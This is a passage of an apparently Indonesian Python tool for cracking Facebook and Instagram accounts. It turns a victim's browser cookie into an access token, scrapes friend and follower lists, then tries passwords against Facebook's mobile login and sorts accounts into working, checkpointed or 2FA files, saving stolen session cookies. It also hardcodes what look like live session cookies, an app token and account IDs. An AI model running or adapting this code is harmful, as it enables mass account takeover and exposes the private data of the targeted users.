                       if 'Tidak, Terima Kasih' in mode.text:
                          mmk = requests.get('https://mbasic.facebook.com'+mode['href'],cookies=self.kuki)
                          asu = bs(mmk.text,'html.parser')
                          self.data.update({
                             "fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(mmk.text)).group(1),
                             "jazoest":re.search('name="jazoest" value="(.*?)"',str(mmk.text)).group(1),
                             "submit":"OK, Gunakan Data"})
                          xxx = asu.find('form', method='post')['action']
                          spn = requests.post('https://mbasic.facebook.com'+xxx,cookies=self.kuki,data=data).text
                          self.YangExp()
               except Exception as e:pass
            else:pass
        except Exception as e:pass

class Logo:

    def __init__(self):
        self.img()

    def img(self):
        yxz = (r'''▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .·▄▄▄▄▄▄▄· 
▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·▐▄▄·▐█ ▀█▪ * Author : KhamdihiDEV
▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄██▪ ▐█▀▀█▄ * Versi  : 0.01
██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌██▌.██▄▪▐█ * Github : khamdihi-dev
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀ ·▀▀▀▀   ''')
        sprint(Panel(yxz,style='bold plum2'))

class Menu:

    def __init__(self):
        self.req_yxz = requests.Session()
        self.api_url = 'https://www.instagram.com/api/v1/friendships/{AkunID!s}/{KhamdihiDEV!s}/'
        self.data,self.maxid = {},''
        self.Ing()

    def Ing(self):
        try:
          mencoba_sc_ku = open('data/login.script','r').read()
        except:
          Tanggal, Bulan, Tahun = datetime.datetime.now().day,datetime.datetime.now().month,datetime.datetime.now().year
          ApaSihKa = '%s-%s-%s.txt'%(Tanggal,Bulan,Tahun)
          open('data/login.script','w').write(ApaSihKa.split('.')[0])
          self.menu(Tanggal, Bulan, Tahun)

        login = open('data/login.script','r').read()
        tgl,bln,thn = login.split('-')
        sprint(Panel(f'[bold green]Selamat datang kembali, kamu login ke script ini pada\nBullan  : {bln}\nTanggal : {tgl}\nTahun   : {thn}', style='bold plum2'));time.sleep(3)
        self.menu(tgl,bln,thn)

    def Log(self):
        kwargs={}
        kwargs.update({
             'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e',
             'scope': 'AXRwYlGFq7cbPc_qrW2iPQsDfFlhlxOLU6GxhbX04V2sOlwdzOUH6tvV4cJOp3puqBU'}
        )
        kwargs.pop('scope',None)
        self.req = requests.Session()
        os.system('clear' if 'LINUX' in sys.platform.upper() else 'cls');Logo()
        mykuki = Console().input('   [bold plum2]└──> ')
        self.item = kwargs
        try:
              get_code = self.req.post('https://graph.facebook.com/v16.0/device/login/', data=self.item).json()
              user_code, code = get_code['user_code'], get_code['code']
        except KeyError:
              exit('\n [!] Gagal Mendapatkan user_code/code')

        try:
              get_items = self.req.get('https://m.facebook.com/device', cookies = {'cookie': mykuki})
              beautiful = beautifulsoup(get_items.text,'html.parser')
              self.name = ["fb_dtsg","jazoest","qr"]
              for y in beautiful.find_all('input'):
                  if y.get('name') in self.name:
                     self.data.update({y.get('name'):y.get('value')})
              self.data.update({
                  "user_code":user_code,
                  "submit":"Lanjut"
              })
              self.post = beautiful.find('form', method='post')['action']
              self.next = requests.post('https://m.facebook.com'+self.post, cookies={'cookie': mykuki}, data=self.data)
              self.pars = beautifulsoup(self.next.text,'html.parser')
              self.data.clear()
              for _r in self.pars.find_all('input'):
                  if _r.get('name') == '__CANCEL__':pass
                  else:self.data.update({_r.get('name'):_r.get('value')})
              self.p = self.pars.find('form', method='post')['action']
              self.r = requests.post("https://m.facebook.com{}".format(self.p),
                  cookies={'cookie':mykuki}, data=self.data).text
              if 'Anda sekarang terhubung ke' in str(self.r):
                  token = requests.get("https://graph.facebook.com/v16.0/device/login_status?method=post&code={}&access_token={}".format(code,
                      self.item.get('access_token'))
                  ).json()
                  print('\n [✓] Your Token : {}'.format(token['access_token']))
                  open('data/cokie.script','w').write(mykuki)
                  open('data/token.script','w').write(token['access_token'])
                  Menu()
              else:
                  exit(f'\n [!] Login gagal\n {self.r}')
        except Exception as r:exit(f'\n [!] Kesalahan takterduga {r}')

    def menu(self, Tanggal, Bullan, nikah_):
        try:
            cokie = open('data/cokie.script','r').read()
            token = open('data/token.script','r').read()
        except FileNotFoundError:
            self.Log()
        try:
            api = self.req_yxz.get('https://graph.facebook.com/v17.0/me?access_token={}'.format(token), cookies={'cookie': cokie}, proxies=None, timeout=10).json()
            uids, name = api['id'], api['name']
        except KeyError:
            self.Log()
        except requests.exceptions.ReadTimeout:
            raise requests.exceptions.ReadTimeout('\n\n [!] Waduh Bank, Buy Kuota Dulu :v')
        self.subz = ('┌───')
        os.system('clear' if 'LINUX' in sys.platform.upper() else 'cls')
        Logo()
        print(cokie)
        sprint(Panel(f'''[bold white][*] Selamat Datang : {name}
[*] Facebook Id    : {uids}
[*] Join Script    : {Tanggal}-{bulan_[int(Bullan)-1]}-{nikah_}
[*] Datetime Now   : {datetime.datetime.now().day}-{bulan_[int(datetime.datetime.now().month)-1]}-{datetime.datetime.now().year}''',style='bold plum2'))
        sprint(Panel('''[bold white]01. Crack Dari File
02. Crack Dari Publik
03. Check Hasil Crack
04. Log Out''',title='[bold plum2]• [bold white]FB [bold plum2]•', style='bold plum2'))
        sprint(Panel('''[bold white]05. Crack Dari Followers
06. Crack Dari Following
07. Check Hasil Crack
08. Log Out''',title='[bold plum2]• [bold white]IG [bold plum2]•', style='bold plum2'))
        sprint(Panel('[bold white]• Pilih Menu Yang Anda Mau Dari 1 sampai 8 Misalnya 5',
        subtitle=self.subz,subtitle_align='left',style='bold plum2'))
        PepeK = Console().input('   [bold plum2]└──> ')
        return self.Pilihan(
            PepeK,
            cokie,
            token
        )
    def Pilihan(self, xyz, kuki, kaway):
        while xyz not in string.digits:
           xyz = Console().input('   [bold red]└──> ')

        if xyz in ('1','01'):
           sprint(Panel('[bold white]Masukan nama file atau jalur lokasinya misalnya /sdcard/filename.txt',
           subtitle=self.subz,subtitle_align='left', style='bold plum2'))
           while True:
              xxx = Console().input('   [bold plum2]└──> ')
              try:
                  acc = open(xxx,'r').read()
                  break
              except:pass
           for xyz in acc.splitlines():
               try:apc,bca = xyz.split('|')
               except:exit('\nInvalid Pemisahan..')
               user_link.append(xyz)
           Crack()

        elif xyz in ('2','02'):
           sprint(Panel('[bold white]Gunakan tada koma sebagai pemisah, jangan gunakan username',
           subtitle=self.subz,subtitle_align='left', style='bold plum2'))
           while True:
              xxx = Console().input('   [bold plum2]└──> ')
              try:
                  for i in xxx.split(','):
                      api = requests.get(f'https://graph.facebook.com/{i}?fields=friends.fields(id,name).limit(5000)&access_token={kaway}', cookies={'cookie':kuki}, proxies=None, timeout=15).json()['friends']
                      for y in api['data']:
                          if y['id'] not in user_link:
                             user_link.append(y['id']+'|'+y['name'])
                          else:pass
              except:
                  if len(user_link) >= 1:
                     break
                  else:exit('\n [!] Teman private..')
              break
           Crack()

        elif xyz in ('3','03'):
           sprint(Panel('[bold white]01. Akun OK\n02. Akun CP\n03. Akun 2F\n04. Akun Pw Salah\n05. kembali',
           subtitle=self.subz,subtitle_align='left', style='plum2'))
           xxx = Console().input('   [bold plum2]└──> ')
           while xxx not in string.digits:
               xxx = Console().input('   [bold red]└──> ')

           if xxx in ('1','01'):
              while True:
                 asu = 0
                 dir = os.listdir('OK')
                 print('\n [ LIST FILE AKUN OK ]\n')
                 for i in dir:
                     asu +=1
                     print(' [%s] %s'%(asu,i))
                 break
              print('\n [!] Salin Nama File Di Atas Dan Paste Di Bawah ini')
              while True:
                 xyz = input(' [?] Nama File : ')
                 try:
                     apcb = open('OK/{}'.format(xyz),'r').read()
                     break
                 except:pass
              print('\n [ SEMUA RESULTS AKUN OK KAMU ]\n')
              for odgj in apcb.splitlines():
                  print(' %s'%(odgj))
           elif xxx in ('2','02'):
              while True:
                 asu = 0
                 dir = os.listdir('CP')
                 print('\n [ LIST FILE AKUN CP ]\n')
                 for i in dir:
                     asu +=1
                     print(' [%s] %s'%(asu,i))
                 break
              print('\n [!] Salin Nama File Di Atas Dan Paste Di Bawah ini')
              while True:
                 xyz = input(' [?] Nama File : ')
                 try:
                     apcb = open('CP/{}'.format(xyz),'r').read()
                     break
                 except:pass
              print('\n [ SEMUA RESULTS AKUN CP KAMU ]\n')
              for odgj in apcb.splitlines():
                  print(' %s'%(odgj))
        elif xyz in ('5','05'):
             sprint(Panel('[bold white]• Masukan Userame Akun Instagram Contohnya KhamdihiXD',
             subtitle=self.subz,subtitle_align='left', style='bold plum2'))
             username = Console().input('   [bold plum2]└──> ')
             converts = self.convert(username)
             if len(user_link) >= 1:
                user_link.clear()
             self.dump_insta(converts,self.api_url,'followers',self.maxid)

    def convert(self, name):
        try:
            hdr = {'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; G3226 Build/48.1.A.2.109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 Instagram 160.0.0.25.132 Android (26/8.0.0; 540dpi; 1080x1758; Sony; G3226; G3226; mt6757; pt_BR; 246889074)','x-ig-app-id': '1217981644879628'}
            req = requests.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={name}', headers=hdr).json()["data"]["user"]["id"]
            return req
        except Exception as e:
            raise KeyError('\n! Gagal Mendapatkan UserId Akun {recode!s}'.format(**{'recode':name}))

    def dump_insta(self, AkunID, api_log, KhamdihiDEV, MaxId):
        rrq = requests.Session().get(api_log.format(**{'AkunID':AkunID}, **{'KhamdihiDEV':KhamdihiDEV}),
        params = {
            'count':'120',
            'search_surface':'follow_list_page'
        },
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; G3226 Build/48.1.A.2.109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 Instagram 160.0.0.25.132 Android (26/8.0.0; 540dpi; 1080x1758; Sony; G3226; G3226; mt6757; pt_BR; 246889074)',
            'x-ig-app-id': '1217981644879628'
        },
        cookies = {
            'cookie':'ig_nrcb=1;datr=ENVuZJuyKLj7Tz6Fra2p-Qlg;mid=ZG7VFgABAAEMjMmzL9-o6HIqd8MM;ig_did=A0B0995D-A913-4E50-B42B-87EBD8F65147;fbm_124024574287414=base_domain=.instagram.com;csrftoken=cBtBxYbgD2mcBAN1HVOejGY9f6UL5BgK;ds_user_id=54599387361;shbid="4866\05454599387361\0541718866372:01f7d0d0bda17668508fff53f7f36dcf5a08a250885fbfd6bb259181d7e3aae7ca7b2312";shbts="1687330372\05454599387361\0541718866372:01f78549c3aadf83cc5571335d5cf9abb765f5e76088e51cec6aa89cd4d9bae7618bcd6b";dpr=2;sessionid=54599387361%3AYetkBwJJ9otRk3%3A1%3AAYeAqbC5rWsUoVUaKpI-cSRL_WghvdizAut7Q6pOVg;fbsr_124024574287414=W2ebhy93_sybPdwrLVOvnsy2fYYpWHdIB5lAr0eKQQM.eyJ1c2VyX2lkIjoiMTAwMDkwNzAzMDkyNTQxIiwiY29kZSI6IkFRQURxa0FySWdjWmtPeGFFZXpYOEpiZzF2WDhPRldWNFhIb28tdS1DMVRiX3dRV2tyMG52cXFhQ0hPREVQeFZDMjc2cmVtejVybkUzTEx1X3IwTTkzaGJZUXJIc1ZrcEtCcDBJLTg4bFJmRWZDTlpKVGZFX0lqbjBsWE9TdUpHZUlMdXc5NzF0MHJqNUl3YlZJOXhrcHlXU3RZdmRMLTRRYXlMWmk3aE1NYUFfVWlJZi1GaFl6VHhyc19KaUxObkJVTkVpajVuNW9CVDVlYi1fUHdtZjZ6RXlTWnZqRmMwclhBV0hSX1h2aF9hOE5XSl9qVnBWaWl0OWd1TzliNG5MQ180TklFRElvcks3al91X3UzNWJ0ZkpFbEduZ3lrRzI5eDd5WFV3U1NpVHRyblJRODBRbzMwYVpjVnA0LTRQN0NGVmF6SWNJWkRLTnE0MlFGZXB5bUluIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQVBLRmZOYzVuV2FnVHlMT3dDVk5QajFlQzJ1bFhDWkFZUkh4UFR2M3BWRE1yRk55T1daQllncHdsWGM1bjkzMWYyWkFmSmxJNURuY0gya0h5Z3gyemxyU1BkZ29vbTVQSzhKQlZ0SlpDdUpVcERHeWlJcE9ZMjNKOThSSlF4ZHkzWkN2WkE5V1lNbUpjZzJ3YnFXc2VZT29aQVgzS3d6aU14bzZKdU5VVzdCWkNQcjhaQXdaQVpCQ2VrWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4NzQ1Nzc5Mn0;rur="PRN\05454599387361\0541718993871:01f72a19cf8992bb213d329ef900489f4a8b874dd2719ead3ebcff27a794721291527595"'
        })
        try:
            for y in rrq.json()['users']:
                if y['username'] not in user_link:
                   user_link.append(y['username']+'<=>'+y['full_name'])
                print(f'\r  • Berhasil dump/get {len(user_link)} akun instagram',end=' '),
                sys.stdout.flush()
            if 'next_max_id' not in json.loads(rrq.text):
                pass
            else:self.dump_insta(
                AkunID, api_log, KhamdihiDEV, MaxId
            )
        except Exception:
            if len(user_link) >=1:
               CrackIG()
            else:
               exit(' • Cari Username Lain Atau Ganti Tumbal')


ses = requests.Session()
def opsi(user,password):
    for pw in password:
        try:
            xurl = ses.get('https://mbasic.facebook.com/').text
            data = {'lsd':re.search('name="lsd" value="(.*?)"', str(xurl)).group(1),
                'jazoest':re.search('name="jazoest" value="(.*?)"', str(xurl)).group(1),
                'm_ts':re.search('name="m_ts" value="(.*?)"', str(xurl)).group(1),
                'li':re.search('name="li" value="(.*?)"', str(xurl)).group(1),
                'try_number':'0',
                'unrecognized_tries':'0',
                'email':user,
                'pass':pw,
                'bi_xrwh':'0'}
            xxxx = {
                'Host': 'mbasic.facebook.com',
                'content-length': '174',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://mbasic.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/15.9.5.1.1',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://mbasic.facebook.com/',
                'accept-encoding': 'gzip',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            resp = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data=data, headers=xxxx)
            sers = bsr(resp.text,'html.parser')
            if 'checkpoint' in ses.cookies.get_dict():
                 data_ = {
                     "fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(resp.text)).group(1),
                     "jazoest":re.search('name="jazoest" value="(.*?)"', str(resp.text)).group(1),
                     "checkpoint_data":"",
                     "submit[Continue]":"Lanjutkan",
                     "nh":re.search('name="nh" value="(.*?)"', str(resp.text)).group(1),}
                 post = ses.post('https://mbasic.facebook.com'+ sers.find('form',method='post')['action'], data=data_)
                 xyzy = bsr(post.text,'html.parser')
                 cari = xyzy.find_all('option')
                 info = re.findall('<title>(.*?)</title>', str(post.text))
                 if len(cari) == 0:
                      if 'Masukkan Kode Masuk untuk Melanjutkan' in info:
                          epep = Tree('\n')
                          epep.add("Authentikasi 2 Faktor On")
                          epep.add("%s|%s"%(user,pw))
                          sprint(epep)
                          with open('CP/A2F.txt',mode='a') as burik:
                              burik.write('%s|%s\n'%(user,pw))
                              burik.close()
                          break
                      elif 'Lihat detail login yang ditampilkan. Ini Anda?' in info:
                          pubg = Tree('\n')
                          pubg.add('Akun Tap Yes, Login di mbasic')
                          pubg.add('%s|%s'%(user,pw)).add(xxxx['user-agent'])
                          sprint(pubg)
                          with open('CP/One_Tap.txt',mode='a') as sakit_mata:
                              sakit_mata.write('%s|%s\n'%(user,pw))
                              sakit_mata.close()
                          break
                      else:
                          emel = Tree('\n')
                          emel.add('Invalid Password (SpamDevice)')
                          emel.add('%s|%s'%(user,pw))
                          sprint(emel)
                          with open('CP/PwInvalid.txt',mode='a') as haram:
                              haram.write("%s|%s"%(user,pw))
                              haram.close()
                          break
                 else:
                      pz = 0
                      rx = Tree('')
                      rx.add('%s|%s'%(user,pw))
                      for y in xyzy.find_all('option'):
                          pz +=1
                          rx.add('%s. %s'%(pz,y.text))
                      sprint(rx)
                      break
            elif 'c_user' in ses.cookies.get_dict():
                 if 'Epsilon' not in sers:
                     coki = (';').join(['%s=%s'%(key,value) for key, value in ses.cookies.get_dict().items()])
                     siap = Tree('\n')
                     siap.add('%s|%s'%(user,pw))
                     siap.add(coki)
                     sprint(siap)
                     with open('OK/OK_CEKOPSI.txt',mode='a') as hoki:
                        hoki.write('%s|%s|%s\n'%(user,pw,coki))
                        hoki.close()
                     break
                 else:
                     sesi = Tree('\n')
                     sesi.add('Eposilon (Akun Terkena Sesi New)')
                     sesi.add('%s|%s'%(user,pw))
                     sprint(sesi)
                     with open('OK/OK_SESINEW.txt',mode='a') as mampus:
                        mampus.write('%s|%s\n'%(user,pw))
                        mampus.close()
                     break
            else:
                 wrong = Tree('\n')
                 wrong.add('Kata Sandi Yang Anda Masukan Salah')
                 wrong.add('%s|%s'%(user,pw))
                 sprint(wrong)
                 with open('CP/KATASANDISALAH.txt',mode='a') as hemm:
                     hemm.write('%s|%s\n'%(user,pw))
                     hemm.close()
                 break
        except Exception as e:print(e)

if __name__ == '__main__':
   try:os.mkdir('OK')
   except:pass
   try:os.mkdir('CP')
   except:pass
   try:os.mkdir('data')
   except:pass
#   Crack()
#   opsi('100085247361493',['mas rya'])
   Menu()
#   Aplikasi('datr=LPBtZNKhqyX91-579SQkUH7c;sb=LPBtZBV_9Re-I8IKManmLqB9;dpr=2;locale=id_ID;vpd=v1%3B630x360x2;wl_cbv=v2%3Bclient_version%3A2274%3Btimestamp%3A1687100713;m_pixel_ratio=2;wd=360x630;c_user=100069739515900;xs=33%3AAjJs0W64yPOHuQ%3A2%3A1687140566%3A-1%3A10846;fr=0gHrJ9pFqh4ulVqdx.AWWRWSJ061PpzpBGPcVP6TWdCtA.BkjGwY.Ws.AAA.0.0.Bkj7jV.AWUEknL1M00;m_page_voice=100069739515900')
